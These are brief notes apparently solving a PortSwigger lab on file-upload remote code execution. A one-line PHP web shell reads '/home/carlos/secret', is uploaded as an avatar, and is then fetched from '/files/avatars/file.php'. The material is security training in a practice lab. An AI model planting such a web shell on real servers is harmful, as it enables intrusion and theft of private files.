https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

nano file.php
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
load file.php in the browser

 In my account page the img tag has a src attribute to `<img src="/files/avatars/file.php" class="avatar">`

get `/files/avatars/file.php`
